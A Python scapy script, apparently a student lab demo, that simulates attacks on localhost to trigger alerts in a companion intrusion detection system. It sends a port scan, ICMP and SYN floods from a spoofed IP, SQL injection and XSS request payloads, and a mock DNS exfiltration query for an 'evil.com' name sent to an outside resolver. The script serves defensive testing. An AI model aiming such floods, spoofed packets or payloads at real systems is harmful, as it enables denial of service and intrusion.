#!/usr/bin/env python3
"""
test_attacks.py — Simulate attacks to demo the NIDS.
Run in a SECOND terminal AFTER starting nids.py.

100% Windows compatible — no os.geteuid()
WARNING: Use ONLY on your own machine / lab environment.
"""

import sys
import time
import ctypes

# ── Windows admin check + auto-elevate ───────────────────
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    try:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas",
            sys.executable,
            " ".join([f'"{arg}"' for arg in sys.argv]),
            None, 1
        )
    except Exception as e:
        print(f"[ERROR] Could not elevate: {e}")
    sys.exit(0)

if not is_admin():
    print("🔐 Requesting administrator privileges...")
    run_as_admin()
    sys.exit(0)

try:
    from scapy.all import IP, TCP, UDP, ICMP, ARP, DNS, DNSQR, send, RandShort, Raw
except ImportError:
    print("[ERROR] Run: pip install scapy")
    sys.exit(1)

TARGET = "127.0.0.1"
SRC    = "192.168.1.200"   # spoofed source IP for demo


def section(title):
    print(f"\n{'─'*60}")
    print(f"  🧪 {title}")
    print(f"{'─'*60}")
    time.sleep(0.5)


def sim_port_scan():
    section("Simulating SYN Port Scan (ports 1-20)")
    for p in range(1, 21):
        send(IP(dst=TARGET)/TCP(dport=p, flags="S"), verbose=False)
        time.sleep(0.05)
    print("  ✅ Done — check NIDS for Port Scan alert")


def sim_icmp_flood():
    section("Simulating ICMP Flood (120 packets)")
    for _ in range(120):
        send(IP(src=SRC, dst=TARGET)/ICMP(), verbose=False)
    print("  ✅ Done — check NIDS for ICMP Flood alert")


def sim_syn_flood():
    section("Simulating SYN Flood on port 80 (220 packets)")
    for _ in range(220):
        send(IP(src=SRC, dst=TARGET)/TCP(
            sport=RandShort(), dport=80, flags="S"), verbose=False)
    print("  ✅ Done — check NIDS for SYN Flood alert")


def sim_dns_exfil():
    section("Simulating DNS Exfiltration (very long hostname)")
    long_name = ("a" * 60) + ".evil.com"
    pkt = IP(src=SRC, dst="8.8.8.8") / UDP(dport=53) / DNS(
        qd=DNSQR(qname=long_name)
    )
    send(pkt, verbose=False)
    print(f"  ✅ Done — sent DNS query for: {long_name}")


def sim_brute_ssh():
    section("Simulating SSH Brute-force (12 SYN to port 22)")
    for _ in range(12):
        send(IP(src=SRC, dst=TARGET)/TCP(dport=22, flags="S"), verbose=False)
        time.sleep(0.1)
    print("  ✅ Done — check NIDS for SSH Brute Force alert")


def sim_sqli():
    section("Simulating SQL Injection payload")
    payload = b"GET /?id=1' OR '1'='1 HTTP/1.0\r\nHost: target\r\n\r\n"
    send(IP(src=SRC, dst=TARGET)/TCP(dport=80, flags="PA")/Raw(load=payload),
         verbose=False)
    print("  ✅ Done — check NIDS for SQL Injection alert")


def sim_xss():
    section("Simulating XSS payload")
    payload = b"GET /?q=<script>alert(1)</script> HTTP/1.0\r\nHost: target\r\n\r\n"
    send(IP(src=SRC, dst=TARGET)/TCP(dport=80, flags="PA")/Raw(load=payload),
         verbose=False)
    print("  ✅ Done — check NIDS for XSS alert")


# ── Main ─────────────────────────────────────────────────
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════╗
║   🧪 NIDS Attack Simulator — CodeAlpha Task 4 Demo  ║
║              100% Windows Compatible                 ║
╚══════════════════════════════════════════════════════╝
  Make sure nids.py is running in another terminal.
  Target: 127.0.0.1  (localhost only)
""")

    print("✅ Admin rights confirmed. Starting simulations...\n")

    sim_port_scan()
    sim_icmp_flood()
    sim_syn_flood()
    sim_dns_exfil()
    sim_brute_ssh()
    sim_sqli()
    sim_xss()

    print(f"""
{'─'*60}
✅ All simulations complete!
   → Check the NIDS GUI window for alerts
   → Alerts also saved in: nids_alerts.json
{'─'*60}
""")
    input("Press Enter to exit...")